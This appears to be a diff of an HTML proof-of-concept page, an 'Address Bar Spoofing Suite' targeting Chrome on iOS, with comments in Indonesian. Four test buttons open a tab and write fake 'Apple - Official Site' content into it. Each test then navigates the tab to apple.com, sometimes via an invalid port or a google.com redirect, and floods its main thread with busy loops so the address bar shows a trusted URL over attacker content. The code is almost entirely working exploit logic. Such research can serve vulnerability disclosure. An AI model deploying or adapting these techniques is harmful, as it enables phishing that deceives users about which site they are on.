@@ -6,7 +6,7 @@
       name="viewport"
       content="width=device-width, initial-scale=1, user-scalable=yes"
     />
-    <title>Advanced Full-Bypass Desync Suite - Zero</title>
+    <title>Ultimate Address Bar Spoofing Suite - Zero</title>
     <style>
       body, html {
         margin: 0;
@@ -65,36 +65,36 @@
   </head>
   <body>
     <div class="container">
-      <h1>Chrome iOS Full-Bypass Test Suite</h1>
+      <h1>Chrome iOS Address Bar Spoofing Suite</h1>
       
-      <!-- Test 1: Microtask & Layout Flooding -->
-      <button id="test1">Test 1: Microtask & Layout Flooding</button>
+      <!-- Test 1: Invalid Port Provisory Stalling -->
+      <button id="test1">Test 1: Invalid Port + Layout Flooding</button>
 
-      <!-- Test 2: Shadow DOM Isolation Stalling -->
-      <button id="test2" class="btn-warning">Test 2: Shadow DOM Isolation Stalling</button>
+      <!-- Test 2: Multi-Stage URL Redirect Hook -->
+      <button id="test2" class="btn-warning">Test 2: Multi-Stage Redirect Stalling</button>
 
-      <!-- Test 3: History State & Mutation Storm -->
+      <!-- Test 3: History State & DOM Mutation Storm -->
       <button id="test3" class="btn-danger">Test 3: History State & Mutation Storm</button>
 
-      <!-- Test 4: Dual-Engine Proxie Timing Bypass -->
-      <button id="test4" class="btn-purple">Test 4: Dual-Engine Timing Bypass</button>
+      <!-- Test 4: Microtask & Shadow DOM Deadlock -->
+      <button id="test4" class="btn-purple">Test 4: Microtask & Shadow DOM Deadlock</button>
     </div>
 
     <script>
-      // Helper universal untuk injeksi awal tab penyerang
+      // Helper untuk injeksi awal konten penyerang (Attacker-Controlled Viewport)
       function injectAttackerContent(win) {
         if (!win) return;
         win.document.write(`
           <!DOCTYPE html>
           <html>
           <head>
-            <title>Apple</title>
+            <title>Apple - Official Site</title>
             <meta name="viewport" content="width=device-width, initial-scale=1">
           </head>
           <body style="margin:0;padding:0;background:#ffffff;display:flex;align-items:center;justify-content:center;height:100vh;text-align:center;font-family:-apple-system,sans-serif;">
             <div>
-              <h1 style="font-size:36px;font-weight:700;color:#1d1d1f;margin:0 0 12px 0;">Security Verification</h1>
-              <p style="font-size:18px;color:#86868b;margin:0;">Bypassing navigation patch filters...</p>
+              <h1 style="font-size:38px;font-weight:700;color:#1d1d1f;margin:0 0 12px 0;">THIS IS NOT APPLE</h1>
+              <p style="font-size:20px;color:#ff3b30;margin:0;font-weight:600;">NAVIGATION PIPELINE DEADLOCK ACTIVE</p>
             </div>
           </body>
           </html>
@@ -103,54 +103,60 @@
         try { win.focus(); } catch (e) {}
       }
 
-      // --- TEST 1: Microtask & Layout Flooding ---
+      // --- TEST 1: Invalid Port + Layout Flooding ---
       document.getElementById("test1").onclick = function () {
         const newTab = window.open("", "_blank");
         if (newTab) {
           injectAttackerContent(newTab);
-          setTimeout(() => { newTab.location.href = "https://apple.com"; }, 12);
+          setTimeout(() => { 
+            try {
+              // Memicu navigasi dengan Port Ilegal/Non-standar untuk membingungkan queue delegate
+              newTab.location.href = "https://apple.com:65535";
+            } catch(e) {
+              newTab.location.href = "https://apple.com";
+            }
+          }, 10);
           setTimeout(() => {
             try {
               newTab.eval(`
                 const start = Date.now();
-                while (Date.now() - start < 2500) {
-                  // Membanjiri microtask queue bersamaan dengan layout thrashing
-                  Promise.resolve().then(() => {});
+                while (Date.now() - start < 3000) {
                   const h = document.body.offsetHeight;
                   document.body.style.background = (h % 2 === 0) ? '#ffffff' : '#fafafa';
                 }
               `);
             } catch (e) {
-              let s = Date.now(); while(Date.now() - s < 2500) {}
+              let s = Date.now(); while(Date.now() - s < 3000) {}
             }
-          }, 65);
+          }, 50);
         }
       };
 
-      // --- TEST 2: Shadow DOM Isolation Stalling ---
+      // --- TEST 2: Multi-Stage Redirect Stalling ---
       document.getElementById("test2").onclick = function () {
         const newTab = window.open("", "_blank");
         if (newTab) {
           injectAttackerContent(newTab);
-          setTimeout(() => { newTab.location.href = "https://apple.com"; }, 15);
+          setTimeout(() => {
+            try {
+              newTab.location.href = "https://google.com";
+              setTimeout(() => {
+                newTab.location.href = "https://apple.com";
+              }, 4);
+            } catch (err) {}
+          }, 10);
           setTimeout(() => {
             try {
               newTab.eval(`
-                const host = document.createElement('div');
-                const shadow = host.attachShadow({mode: 'open'});
-                shadow.innerHTML = '<style>div{background:red;}</style><div>Stalled</div>';
-                document.body.appendChild(host);
-                
                 const start = Date.now();
-                while (Date.now() - start < 2500) {
-                  const f = host.offsetHeight;
-                  shadow.host.style.width = (f % 2 === 0) ? '100px' : '101px';
+                while (Date.now() - start < 3000) {
+                  const rects = document.body.getClientRects();
                 }
               `);
             } catch (e) {
-              let s = Date.now(); while(Date.now() - s < 2500) {}
+              let s = Date.now(); while(Date.now() - s < 3000) {}
             }
-          }, 70);
+          }, 45);
         }
       };
 
@@ -161,7 +167,7 @@
           injectAttackerContent(newTab);
           setTimeout(() => {
             try {
-              newTab.history.pushState({bypass: true}, "", "#secure-enclave");
+              newTab.history.pushState({spoof: true}, "", "#secure-enclave");
               newTab.location.href = "https://apple.com";
             } catch (err) {}
           }, 10);
@@ -170,45 +176,45 @@
               newTab.eval(`
                 const start = Date.now();
                 const body = document.body;
-                while (Date.now() - start < 2800) {
+                while (Date.now() - start < 3000) {
                   history.pushState({rand: Math.random()}, "", "#flood");
                   const el = document.createElement('span');
                   body.appendChild(el);
-                  if(body.childNodes.length > 80) body.innerHTML = "<h1>Locked</h1>";
+                  if(body.childNodes.length > 70) body.innerHTML = "<h1>Locked State</h1>";
                 }
               `);
             } catch (e) {
-              let s = Date.now(); while(Date.now() - s < 2800) {}
+              let s = Date.now(); while(Date.now() - s < 3000) {}
             }
-          }, 60);
+          }, 55);
         }
       };
 
-      // --- TEST 4: Dual-Engine Proxie Timing Bypass ---
+      // --- TEST 4: Microtask & Shadow DOM Deadlock ---
       document.getElementById("test4").onclick = function () {
         const newTab = window.open("", "_blank");
         if (newTab) {
           injectAttackerContent(newTab);
-          setTimeout(() => {
-            try {
-              newTab.location.href = "https://google.com";
-              setTimeout(() => {
-                newTab.location.href = "https://apple.com";
-              }, 5);
-            } catch (err) {}
-          }, 8);
+          setTimeout(() => { newTab.location.href = "https://apple.com"; }, 12);
           setTimeout(() => {
             try {
               newTab.eval(`
+                const host = document.createElement('div');
+                const shadow = host.attachShadow({mode: 'open'});
+                shadow.innerHTML = '<div>Deadlock</div>';
+                document.body.appendChild(host);
+                
                 const start = Date.now();
-                while (Date.now() - start < 2500) {
-                  const check = document.body.getClientRects();
+                while (Date.now() - start < 3000) {
+                  Promise.resolve().then(() => {});
+                  const f = host.offsetHeight;
+                  shadow.host.style.width = (f % 2 === 0) ? '100px' : '101px';
                 }
               `);
             } catch (e) {
-              let s = Date.now(); while(Date.now() - s < 2500) {}
+              let s = Date.now(); while(Date.now() - s < 3000) {}
             }
-          }, 50);
+          }, 60);
         }
       };
     </script>
